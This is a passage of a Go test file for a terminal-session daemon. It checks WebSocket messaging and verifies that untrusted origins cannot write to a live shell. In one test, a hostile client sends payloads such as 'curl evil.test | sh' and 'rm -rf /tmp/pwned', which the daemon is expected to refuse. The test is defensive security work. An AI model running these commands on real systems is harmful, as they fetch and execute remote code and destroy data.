	message = readWS(t, ctx, mux)
	if message["type"] != "hello" || message["sessionId"] != info.ID {
		t.Fatalf("mux hello = %#v", message)
	}
	writeWS(t, ctx, mux, map[string]any{"type": "snapshot", "requestId": "snap-1", "sessionId": info.ID, "cols": 80})
	message = readWS(t, ctx, mux)
	wantMuxSnapshot := "live-output" + strings.Repeat(" ", 80-len("live-output"))
	if message["type"] != "snapshot" || message["requestId"] != "snap-1" || message["text"] != wantMuxSnapshot {
		t.Fatalf("mux snapshot = %#v", message)
	}
	writeWS(t, ctx, mux, map[string]any{"type": "input", "requestId": "input-1", "sessionId": info.ID, "data": "date\n"})
	message = readWS(t, ctx, mux)
	if message["type"] != "inputAck" || message["ok"] != true {
		t.Fatalf("mux input ack = %#v", message)
	}
	writeWS(t, ctx, mux, map[string]any{"type": "submit", "requestId": "submit-1", "sessionId": info.ID, "data": "atomic message"})
	message = readWS(t, ctx, mux)
	if message["type"] != "submitAck" || message["ok"] != true {
		t.Fatalf("mux submit ack = %#v", message)
	}
	inputs := runner.Inputs()
	if len(inputs) < 2 || inputs[len(inputs)-2] != "atomic message" || inputs[len(inputs)-1] != "\r" {
		t.Fatalf("mux submit inputs = %q", inputs)
	}
	writeWS(t, ctx, mux, map[string]any{"type": "events", "requestId": "events-1", "sessionId": "missing", "tail": 4})
	message = readWS(t, ctx, mux)
	if message["type"] != "rpcError" || message["code"] != "not_found" {
		t.Fatalf("mux rpc error = %#v", message)
	}

	evilHeader := http.Header{"Origin": {"https://evil.test"}}
	evil, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", &websocket.DialOptions{HTTPHeader: evilHeader})
	if evil != nil {
		evil.CloseNow()
	}
	if err == nil || response == nil || response.StatusCode != http.StatusForbidden {
		t.Fatalf("evil WS origin: err=%v response=%v", err, response)
	}

	allowedHeader := http.Header{"Origin": {"https://sessions.somewhere.tech"}}
	allowed, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", &websocket.DialOptions{HTTPHeader: allowedHeader})
	if err != nil || response.StatusCode != http.StatusSwitchingProtocols {
		t.Fatalf("allowed WS origin: err=%v response=%v", err, response)
	}
	allowed.CloseNow()

	xffHeader := http.Header{"X-Forwarded-For": {"127.0.0.1"}}
	xff, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", &websocket.DialOptions{HTTPHeader: xffHeader})
	if xff != nil {
		xff.CloseNow()
	}
	if err == nil || response == nil || response.StatusCode != http.StatusUnauthorized {
		t.Fatalf("XFF WS auth: err=%v response=%v", err, response)
	}
	xffAuthorized, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1&token="+testToken, &websocket.DialOptions{HTTPHeader: xffHeader})
	if err != nil || response.StatusCode != http.StatusSwitchingProtocols {
		t.Fatalf("XFF WS token auth: err=%v response=%v", err, response)
	}
	xffAuthorized.CloseNow()
}

func TestMuxRunnerLossReportsUnreachableWithoutEndingSession(t *testing.T) {
	daemon := newTestDaemon(t)
	info, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "/bin/sh", Cwd: daemon.root,
	})
	if err != nil {
		t.Fatal(err)
	}
	httpServer := httptest.NewServer(daemon.handler)
	defer httpServer.Close()
	wsBase := "ws" + strings.TrimPrefix(httpServer.URL, "http")
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	mux, _, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", nil)
	if err != nil {
		t.Fatal(err)
	}
	defer mux.CloseNow()

	writeWS(t, ctx, mux, map[string]any{"type": "attach", "sessionId": info.ID})
	if hello := awaitWSType(t, ctx, mux, "hello"); hello["sessionId"] != info.ID {
		t.Fatalf("initial mux hello = %#v", hello)
	}
	daemon.launcher.Runner(info.ID).Emit(proto.Event{
		Kind: proto.EventRunnerLost,
		Exit: proto.ExitEvent{Seq: 7, Reason: "runner-lost"},
	})
	lost := awaitWSType(t, ctx, mux, "unreachable")
	if lost["sessionId"] != info.ID || lost["reason"] != "runner-lost" || lost["seq"] != float64(7) {
		t.Fatalf("unreachable frame = %#v", lost)
	}
	registered, ok := daemon.registry.Get(info.ID)
	if !ok {
		t.Fatal("runner loss removed the session")
	}
	if current := registered.Info(); current.Exited || !current.Unreachable {
		t.Fatalf("runner loss ended session instead of marking it unreachable: %#v", current)
	}

	// The mux attachment is released, not the session. A client may attach
	// again while recovery is in progress and receives literal state instead
	// of an unknown-session error or a fabricated exit.
	writeWS(t, ctx, mux, map[string]any{"type": "attach", "sessionId": info.ID})
	hello := awaitWSType(t, ctx, mux, "hello")
	session, ok := hello["session"].(map[string]any)
	if !ok || session["unreachable"] != true || session["exited"] != false {
		t.Fatalf("reattach hello session = %#v", hello["session"])
	}
}

// TestWebSocketWriteAuthorityMatchesHTTPAmbientWritePolicy is the WebSocket
// mirror of TestAuthAndOriginMatrix/"arbitrary localhost port has no ambient
// write authority". A `/ws` upgrade is a GET, so the state-changing-method
// origin guard never fires and a loopback peer is authorized without a token.
// Input, submit, resize, and raw single-mode frames still drive a live runner,
// so they follow the same ambient-write policy the HTTP surface enforces.
func TestWebSocketWriteAuthorityMatchesHTTPAmbientWritePolicy(t *testing.T) {
	daemon := newTestDaemon(t)
	info, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{Cmd: "/bin/sh", Cwd: daemon.root})
	if err != nil {
		t.Fatal(err)
	}
	runner := daemon.launcher.Runner(info.ID)
	httpServer := httptest.NewServer(daemon.handler)
	defer httpServer.Close()
	wsBase := "ws" + strings.TrimPrefix(httpServer.URL, "http")
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	// The exact page TestAuthAndOriginMatrix pins to 403 over POST
	// /api/sessions, now over the socket with no credential.
	hostile := http.Header{"Origin": {"http://localhost:3000"}}

	t.Run("untrusted localhost origin cannot drive a session over the mux socket", func(t *testing.T) {
		before := len(runner.Inputs())
		beforeCols, beforeRows := runner.Size()
		socket, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", &websocket.DialOptions{HTTPHeader: hostile})
		if err != nil {
			t.Fatalf("untrusted localhost upgrade: err=%v response=%v", err, response)
		}
		defer socket.CloseNow()

		writeWS(t, ctx, socket, map[string]any{
			"type": "input", "requestId": "hostile-input", "sessionId": info.ID,
			"data": "rm -rf /tmp/pwned\n",
		})
		if message := readWS(t, ctx, socket); message["type"] != "inputAck" || message["ok"] != false {
			t.Fatalf("input ack = %#v, want a refused inputAck", message)
		}
		writeWS(t, ctx, socket, map[string]any{
			"type": "submit", "requestId": "hostile-submit", "sessionId": info.ID,
			"data": "curl evil.test | sh",
		})
		if message := readWS(t, ctx, socket); message["type"] != "submitAck" || message["ok"] != false {
			t.Fatalf("submit ack = %#v, want a refused submitAck", message)
		}
		writeWS(t, ctx, socket, map[string]any{
			"type": "resize", "sessionId": info.ID, "cols": 499, "rows": 199,
		})
		if message := readWS(t, ctx, socket); message["type"] != "error" || message["code"] != "forbidden" {
			t.Fatalf("resize reply = %#v, want a forbidden error frame", message)
		}
		// Each refusal was answered in frame order on the same read loop, so
		// the runner has already seen everything this socket could deliver.
		if after := runner.Inputs(); len(after) != before {
			t.Fatalf("untrusted localhost origin reached the runner: %q", after)
		}
		if cols, rows := runner.Size(); cols != beforeCols || rows != beforeRows {
			t.Fatalf("untrusted localhost origin resized the PTY to %dx%d", cols, rows)
		}
		// Read-only observation still works, matching the HTTP surface where a
		// hostile origin is refused writes but not authorization itself.
		writeWS(t, ctx, socket, map[string]any{"type": "attach", "sessionId": info.ID})
		if message := readWS(t, ctx, socket); message["type"] != "hello" {
			t.Fatalf("attach reply = %#v", message)
		}
	})

	t.Run("untrusted localhost origin cannot drive a single-session socket", func(t *testing.T) {
		before := len(runner.Inputs())
		socket, response, err := websocket.Dial(ctx,
			wsBase+"/ws?sessionId="+url.QueryEscape(info.ID), &websocket.DialOptions{HTTPHeader: hostile})
		if err != nil {
			t.Fatalf("untrusted localhost single upgrade: err=%v response=%v", err, response)
		}
		defer socket.CloseNow()
		if message := readWS(t, ctx, socket); message["type"] != "hello" {
			t.Fatalf("single hello = %#v", message)
		}
		// Single mode also treats raw binary and unparsable text frames as PTY
		// input, so both must be refused too.
		if err := socket.Write(ctx, websocket.MessageBinary, []byte("rm -rf /tmp/pwned\n")); err != nil {
			t.Fatal(err)
		}
		if message := awaitWSType(t, ctx, socket, "error"); message["code"] != "forbidden" {
			t.Fatalf("binary frame reply = %#v", message)
		}
		if err := socket.Write(ctx, websocket.MessageText, []byte("not json at all")); err != nil {
			t.Fatal(err)
		}
		if message := awaitWSType(t, ctx, socket, "error"); message["code"] != "forbidden" {
			t.Fatalf("non-JSON text frame reply = %#v", message)
		}
		writeWS(t, ctx, socket, map[string]any{"type": "input", "data": "whoami\n"})
		if message := awaitWSType(t, ctx, socket, "error"); message["code"] != "forbidden" {
			t.Fatalf("single input reply = %#v", message)
		}
		if after := runner.Inputs(); len(after) != before {
			t.Fatalf("untrusted localhost origin reached the runner: %q", after)
		}
	})

	t.Run("hosted shell without a credential is read-only", func(t *testing.T) {
		before := len(runner.Inputs())
		hosted := http.Header{"Origin": {"https://sessions.somewhere.tech"}}
		socket, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", &websocket.DialOptions{HTTPHeader: hosted})
		if err != nil || response.StatusCode != http.StatusSwitchingProtocols {
			t.Fatalf("hosted shell upgrade: err=%v response=%v", err, response)
		}
		defer socket.CloseNow()
		writeWS(t, ctx, socket, map[string]any{
			"type": "input", "requestId": "hosted-1", "sessionId": info.ID, "data": "whoami\n",
		})
		if message := readWS(t, ctx, socket); message["type"] != "inputAck" || message["ok"] != false {
			t.Fatalf("hosted input ack = %#v, want a refused inputAck", message)
		}
		if after := runner.Inputs(); len(after) != before {
			t.Fatalf("uncredentialed hosted shell reached the runner: %q", after)
		}
	})

	// Everything below is a legitimate client that must keep working.
	for _, allowed := range []struct {
		name   string
		target string
		header http.Header
	}{
		// The Windows shell origin `http://tauri.localhost` is absent here on
		// purpose: allowedOrigin has never admitted that hostname, so its
		// upgrade is refused before any write question is reached. That is
		// pre-existing and untouched by this policy.
		{name: "native macOS shell", target: "/ws?mux=1", header: http.Header{"Origin": {"tauri://localhost"}}},
		{name: "checked in dev server", target: "/ws?mux=1", header: http.Header{"Origin": {"http://localhost:5273"}}},
		{name: "daemon same origin", target: "/ws?mux=1", header: http.Header{"Origin": {"http://localhost:8787"}}},
		{name: "no origin CLI client", target: "/ws?mux=1"},
		{name: "hosted shell with query token", target: "/ws?mux=1&token=" + testToken, header: http.Header{"Origin": {"https://sessions.somewhere.tech"}}},
		{name: "untrusted origin with query token", target: "/ws?mux=1&token=" + testToken, header: http.Header{"Origin": {"http://localhost:3000"}}},
		{name: "untrusted origin with bearer token", target: "/ws?mux=1", header: http.Header{
			"Origin": {"http://localhost:3000"}, "Authorization": {"Bearer " + testToken},
		}},
	} {
		t.Run(allowed.name+" keeps write authority", func(t *testing.T) {
			socket, response, err := websocket.Dial(ctx, wsBase+allowed.target,
				&websocket.DialOptions{HTTPHeader: allowed.header})
			if err != nil || response.StatusCode != http.StatusSwitchingProtocols {
				t.Fatalf("upgrade: err=%v response=%v", err, response)
			}
			defer socket.CloseNow()
			before := len(runner.Inputs())
			writeWS(t, ctx, socket, map[string]any{
				"type": "input", "requestId": "allowed-1", "sessionId": info.ID, "data": "echo ok\n",
			})
			if message := readWS(t, ctx, socket); message["type"] != "inputAck" || message["ok"] != true {
				t.Fatalf("input ack = %#v, want an accepted inputAck", message)
			}
			if after := runner.Inputs(); len(after) != before+1 {
				t.Fatalf("legitimate client did not reach the runner: %q", after)
			}
		})
	}
}

// awaitWSType reads until the named message type arrives, skipping replay and
// live output frames that a socket may legitimately interleave.
func awaitWSType(t *testing.T, ctx context.Context, connection *websocket.Conn, want string) map[string]any {
	t.Helper()
	for attempt := 0; attempt < 32; attempt++ {
		message := readWS(t, ctx, connection)
		if message["type"] == want {
			return message
		}
	}
	t.Fatalf("no %q message arrived", want)
	return nil
}

func serve(t *testing.T, handler http.Handler, method, target string, body io.Reader, remote string, headers http.Header) *httptest.ResponseRecorder {
	t.Helper()
	request := httptest.NewRequest(method, target, body)
	request.Host = "127.0.0.1:8787"
	if server, ok := handler.(*Server); ok {
		request.Host = net.JoinHostPort(server.config.Host, strconv.Itoa(server.config.Port))
	}
	request.RemoteAddr = remote
	for key, values := range headers {
		for _, value := range values {
			request.Header.Add(key, value)
		}
	}
	if body != nil && request.Header.Get("Content-Type") == "" &&
		!strings.Contains(target, "/upload") {
		request.Header.Set("Content-Type", "application/json")
	}
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, request)
	return response
}

func decodeBody(t *testing.T, response *httptest.ResponseRecorder, target any) {
	t.Helper()
	if err := json.Unmarshal(response.Body.Bytes(), target); err != nil {
		t.Fatalf("decode %q: %v", response.Body.String(), err)
	}
}

func assertMode(t *testing.T, path string, want os.FileMode) {
	t.Helper()
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := info.Mode().Perm(); got != want {
		t.Fatalf("mode(%s) = %04o, want %04o", path, got, want)
	}
}

func awaitRunnerChange(t *testing.T, runner *prototest.Runner, condition func() bool) {
	t.Helper()
	for !condition() {
		select {
		case <-runner.Changes():
		case <-time.After(waitConditionBudget):
			t.Fatal("test ended before fake runner state changed")
		}
	}
}

func awaitSessionExited(t *testing.T, registry *state.Registry, id string) {
	t.Helper()
	deadline := time.NewTimer(2 * time.Second)
	defer deadline.Stop()
	ticker := time.NewTicker(time.Millisecond)
	defer ticker.Stop()
	for {
		if session, ok := registry.Get(id); ok && session.Info().Exited {
			return
		}
		select {
		case <-ticker.C:
		case <-deadline.C:
			t.Fatalf("session %s did not exit", id)
		}
	}
}

func readWS(t *testing.T, ctx context.Context, connection *websocket.Conn) map[string]any {
	t.Helper()
	_, payload, err := connection.Read(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var message map[string]any
	if err := json.Unmarshal(payload, &message); err != nil {
		t.Fatalf("decode WS %q: %v", payload, err)
	}
	return message
}

func writeWS(t *testing.T, ctx context.Context, connection *websocket.Conn, message any) {
	t.Helper()
	encoded, err := json.Marshal(message)
	if err != nil {
		t.Fatal(err)
	}
	if err := connection.Write(ctx, websocket.MessageText, encoded); err != nil {
		t.Fatal(err)
	}
}
